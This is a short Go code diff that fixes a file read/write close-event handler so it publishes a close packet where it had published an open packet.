@@ -132,7 +132,7 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 
 	burat.Bushido().FileRW.OnClose(func (id string) {
 		fmt.Println("filerw.close", id)
-		packet := burat.Seen(packets.FilerwOnOpenPacket {	Id: id })
+		packet := burat.Seen(packets.FilerwOnClosePacket {	Id: id })
 		burat.Publish(id, "filerw_evt_close", 2, false, packet)
 	})
 
